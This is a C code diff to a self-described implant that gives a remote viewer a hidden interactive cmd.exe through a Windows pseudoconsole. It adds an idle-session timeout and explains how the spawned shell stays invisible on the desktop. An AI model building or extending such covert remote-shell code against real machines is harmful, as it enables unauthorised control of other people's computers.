@@ -545,6 +545,14 @@ static int conpty_init(void) {
    viewer stayed connected. A cap turns a spawn loop into a closed session. */
 #define TERM_MAX_RESPAWNS 3
 
+/* How long a terminal session may sit with nobody typing in it before it is
+   ended. A shell is opened *for* a viewer; once that viewer has gone it is a
+   cmd.exe and a ConPTY held for nothing — and because the respawn logic above
+   restarts a shell that exits, an abandoned one is not even cheap to leave.
+   Five minutes outlasts the pause before anyone's first command and is short
+   enough that a forgotten session does not outlive the coffee. */
+#define TERM_IDLE_MS (5 * 60 * 1000)
+
 typedef struct {
     int active;
     /* TRUE once the critical section has been initialised. Every code path that
@@ -563,6 +571,7 @@ typedef struct {
     HANDLE hReaderThread;  /* background reader thread */
     int reader_exited;     /* set by reader thread when pipe breaks */
     int restarts;          /* shells respawned in this session, <= TERM_MAX_RESPAWNS */
+    DWORD last_input;      /* GetTickCount of the last keystroke from a viewer */
 } term_session_t;
 
 static term_session_t g_term;
@@ -2610,7 +2619,9 @@ static void term_write_input(const char *data, int len) {
     if (!ok) {
         /* Pipe broken — flag for restart */
         g_term.reader_exited = 1;
+        return;
     }
+    g_term.last_input = GetTickCount();
 }
 
 static void term_stop_quiet(void) {
@@ -2648,6 +2659,14 @@ static void term_stop(void) {
 }
 
 static int term_drain(void) {
+    /* A session nobody is typing into is a session nobody is watching. End it
+       rather than hold a shell open for an audience that has left. */
+    if (g_term.inited && g_term.active && g_term.last_input &&
+        (GetTickCount() - g_term.last_input) > TERM_IDLE_MS) {
+        DBG("[term] no viewer input for %d s — ending the session\n", TERM_IDLE_MS / 1000);
+        term_stop();
+        return 0;
+    }
     /* Detect child process exit and auto-restart */
     if (g_term.inited && g_term.active && g_term.reader_exited) {
         /* Clean up the dead ConPTY and restart */
@@ -2721,6 +2740,10 @@ static int run_interactive(const char *to, const char *id) {
     g_term.hPipeOut = INVALID_HANDLE_VALUE;
     g_term.hProcess = INVALID_HANDLE_VALUE;
     g_term.hReaderThread = INVALID_HANDLE_VALUE;
+    /* Start the idle clock now, not on the first keystroke. A session that is
+       opened and then abandoned has no keystroke coming, so waiting for one
+       would leave exactly the case worth reaping alive forever. */
+    g_term.last_input = GetTickCount();
 
     strncpy(g_term.id, id, sizeof(g_term.id) - 1);
     strncpy(g_term.to, to, sizeof(g_term.to) - 1);
@@ -2790,9 +2813,27 @@ static int run_interactive(const char *to, const char *id) {
         return -1;
     }
 
-    /* Launch cmd.exe attached to the ConPTY */
     PROCESS_INFORMATION pi = {0};
     wchar_t cmdline[] = L"cmd.exe";
+
+    /* Launch cmd.exe attached to the ConPTY.
+
+       EXTENDED_STARTUPINFO_PRESENT alone, deliberately. CREATE_NO_WINDOW and
+       STARTF_USESHOWWINDOW look like belt-and-braces here and are not: with
+       PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE the pseudoconsole *is* the child's
+       console, and adding either flag makes cmd.exe start and then emit nothing
+       at all - it runs, it is invisible, and every command silently returns
+       nothing to the viewer. Verified by reverting: with the flags the session
+       opens and produces zero bytes; without them the banner and prompt come
+       straight through.
+
+       The window that prompted all this was never this call's fault. A
+       pseudoconsole keeps its child invisible, so what put a console on the
+       desktop was an *orphaned* cmd.exe left behind when the implant was killed
+       mid-session - the pseudoconsole it belonged to was gone, and it fell back
+       to a real console whose handles were dead, hence "The handle is
+       invalid". The cure is tearing the session down cleanly (see TERM_IDLE_MS)
+       rather than hiding a window that should not have been created. */
     if (!CreateProcessW(NULL, cmdline, NULL, NULL, FALSE,
             EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,
             &sie.StartupInfo, &pi)) {
